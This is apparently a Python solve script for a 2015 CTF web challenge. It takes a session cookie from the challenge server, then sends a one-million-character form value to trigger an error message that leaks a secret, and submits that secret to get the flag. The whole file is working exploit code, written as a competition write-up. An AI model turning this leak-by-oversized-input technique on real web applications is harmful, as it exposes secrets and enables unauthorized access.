#!/usr/bin/python
#
# Teaser CONFidence CTF 2015
# Practical numerology (WEB/300)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import socket
import re

url = '134.213.136.172'
data = 'guess='

payload1 = 'GET / HTTP/1.1\r\n'
payload1 += 'Host: 134.213.136.172\r\n\r\n'

payload2 = "POST / HTTP/1.1\r\n"
payload2 += "Host: 134.213.136.172\r\n"
payload2 += "Cookie: PHPSESSID={}\r\n"
payload2 += "Content-Length: {}\r\n"
payload2 += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
payload2 += "{}"

s = socket.create_connection((url, 80))
s.send(payload1)
cookie = re.findall('PHPSESSID=(.*);', s.recv(1500))[0]
s.close()

s = socket.create_connection((url, 80))
guess = data + 'A'*1000000
s.send(payload2.format(cookie, len(guess), guess))
secret = re.findall("'(.*)' !=", s.recv(500))[0]
s.close()

s = socket.create_connection((url, 80))
guess = data + secret
s.send(payload2.format(cookie, len(guess), guess))
print s.recv(2000).splitlines()[-1]
s.close()